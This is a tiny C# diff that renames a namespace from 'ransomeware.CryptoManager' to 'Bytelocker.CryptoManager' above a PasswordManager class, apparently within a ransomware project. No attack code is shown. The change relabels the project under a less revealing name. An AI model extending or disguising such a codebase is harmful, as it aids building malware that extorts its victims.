@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-namespace ransomeware.CryptoManager
+namespace Bytelocker.CryptoManager
 {
     class PasswordManager
     {
